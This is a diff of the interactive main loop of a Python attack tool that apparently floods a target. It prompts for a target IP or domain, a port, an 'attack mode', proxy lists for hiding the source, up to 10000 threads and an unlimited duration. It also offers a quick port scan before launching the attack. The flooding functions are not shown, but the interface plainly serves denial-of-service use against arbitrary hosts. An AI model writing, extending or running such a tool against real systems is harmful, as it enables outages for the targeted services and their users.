-        target = input(f"{color.CYAN}[?] Target IP or Domain: {color.RESET}").strip()
-        if not target:
-            print(f"{color.RED}[-] Target cannot be empty.{color.RESET}")
-            handle_error()
-            continue
-
-        target_ip = resolve_target(target)
-        if not target_ip:
-            handle_error()
-            continue
-
+        banner()
+        print()
+        panel("SYSTEM INFO", [
+            f"Platform : {sys.platform}",
+            f"Python   : {sys.version.split()[0]}",
+            f"PID      : {os.getpid()}",
+            f"Scapy    : {'YES' if SCAPY_AVAILABLE else 'NO'}",
+        ])
+        print()
         try:
-            target_port = int(input(f"{color.CYAN}[?] Target port (default 80): {color.RESET}").strip() or 80)
-            if target_port <= 0:
-                raise ValueError
-        except ValueError:
-            print(f"{color.RED}[-] Port must be greater than zero.{color.RESET}")
-            handle_error()
-            continue
+            while True:
+                t = input(f"{C.BLU}  ┌─[{C.WHT}1/5{C.BLU}] Target IP / Domain: {C.R}").strip()
+                if t.lower() == 'exit':
+                    print(f"{C.GRN}[*] Goodbye!{C.R}")
+                    sys.exit(0)
+                try:
+                    ip = gethostbyname(t)
+                    print(f"{C.GRN}  └─[+] Resolved: {C.WHT}{ip}{C.R}\n")
+                    break
+                except socket.gaierror:
+                    print(f"{C.RED}  └─[-] Cannot resolve target.{C.R}\n")
+                    if prompt_err() == 'e': continue
+                    break
 
-        try:
-            threads = int(input(f"{color.CYAN}[?] Threads (default 10): {color.RESET}").strip() or 10)
-            if threads <= 0:
-                raise ValueError
+            while True:
+                pi = input(f"{C.BLU}  ┌─[{C.WHT}2/5{C.BLU}] Port (1-65535): {C.R}").strip()
+                if pi.lower() == 'exit':
+                    print(f"{C.GRN}[*] Goodbye!{C.R}")
+                    sys.exit(0)
+                try:
+                    port = int(pi)
+                    if not 1 <= port <= 65535: raise ValueError
+                    print(f"{C.GRN}  └─[+] Port set: {C.WHT}{port}{C.R}\n")
+                    break
+                except ValueError:
+                    print(f"{C.RED}  └─[-] Invalid port.{C.R}\n")
+                    if prompt_err() == 'e': continue
+                    break
 
-        except ValueError:
-            print(f"{color.RED}[-] Threads must be greater than zero.{color.RESET}")
-            handle_error()
-            continue
+            if input(f"{C.BLU}  ┌─[{C.WHT}?{C.BLU}] Quick port scan? (y/n): {C.R}").strip().lower() == 'y':
+                print(f"{C.CYN}  └─[*] Scanning...{C.R}\n")
+                panel("PORT SCAN", [f"{p:<8} {s}" for p, s in scan(ip, [21,22,23,53,80,443,3306,3389,8080])], C.MAG)
+                print()
 
-        proxy_list = None
-        if mode == "proxy":
-            proxy_file = input(f"{color.CYAN}[?] Proxy list file (default proxies.txt): {color.RESET}").strip() or "proxies.txt"
-            proxy_list = load_proxies(proxy_file)
-            if not proxy_list:
-                print(f"{color.RED}[-] No proxies loaded. Aborting.{color.RESET}")
-                handle_error()
-                continue
-            proxy_list = validate_proxies(proxy_list)
-            if not proxy_list:
-                print(f"{color.RED}[-] No valid proxies found. Aborting.{color.RESET}")
-                handle_error()
-                continue
+            while True:
+                print(f"{C.D}  modes: {' / '.join(modes)}{C.R}")
+                m = input(f"{C.BLU}  ┌─[{C.WHT}3/5{C.BLU}] Attack mode: {C.R}").strip().lower()
+                if m == 'exit':
+                    print(f"{C.GRN}[*] Goodbye!{C.R}")
+                    sys.exit(0)
+                if m in modes:
+                    print(f"{C.GRN}  └─[+] Mode: {C.WHT}{m}{C.R}\n")
+                    break
+                print(f"{C.RED}  └─[-] Invalid mode.{C.R}\n")
+                if prompt_err() == 'e': continue
+                break
 
-        print(f"\n{color.GREEN}[*] Launching {mode.upper()} against {target_ip}:{target_port} with {threads} threads...{color.RESET}")
-        print(f"{color.DIM}[*] Press Ctrl+C to stop.{color.RESET}\n")
+            proxies = None
+            if m == "proxy":
+                pf = input(f"{C.BLU}  ┌─[{C.WHT}+{C.BLU}] Proxy file (ip:port per line): {C.R}").strip()
+                proxies = load_proxies(pf)
+                if proxies and input(f"{C.BLU}  ├─[{C.WHT}?{C.BLU}] Validate proxies? (y/n): {C.R}").strip().lower() == 'y':
+                    proxies = validate_proxies(proxies)
+                if not proxies:
+                    print(f"{C.RED}  └─[-] No proxies, falling back to tcp.{C.R}\n")
+                    m = "tcp"
 
-        run_attack(target_ip, target_port, mode, threads, proxy_list)
+            while True:
+                ti = input(f"{C.BLU}  ┌─[{C.WHT}4/5{C.BLU}] Threads (1-10000): {C.R}").strip()
+                if ti.lower() == 'exit':
+                    print(f"{C.GRN}[*] Goodbye!{C.R}")
+                    sys.exit(0)
+                try:
+                    th = int(ti)
+                    if not 1 <= th <= 10000: raise ValueError
+                    print(f"{C.GRN}  └─[+] Threads: {C.WHT}{th}{C.R}\n")
+                    break
+                except ValueError:
+                    print(f"{C.RED}  └─[-] Invalid thread count.{C.R}\n")
+                    if prompt_err() == 'e': continue
+                    break
 
-        if handle_error(allow_edit=False) == 'n':
-            print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
-            break
+            while True:
+                di = input(f"{C.BLU}  ┌─[{C.WHT}5/5{C.BLU}] Duration seconds (0=unlimited): {C.R}").strip()
+                try:
+                    dur = int(di)
+                    if dur < 0: raise ValueError
+                    print(f"{C.GRN}  └─[+] Duration: {C.WHT}{'unlimited' if dur == 0 else f'{dur}s'}{C.R}\n")
+                    break
+                except ValueError:
+                    print(f"{C.RED}  └─[-] Invalid duration.{C.R}\n")
+
+            os.system("clear")
+            print(f"{C.CYN}{C.B}  [*] Starting... Ctrl+C to stop.{C.R}")
+            print(f"{C.YEL}  [*] Verification every 10s.{C.R}\n")
+            run(ip, port, m, 64, th, proxies, dur if dur > 0 else None)
+            print()
+            prompt_err(edit=False)
+        except Exception as ex:
+            print(f"{C.RED}[!] {ex}{C.R}")
+            time.sleep(2)
 
 if __name__ == "__main__":
     main()
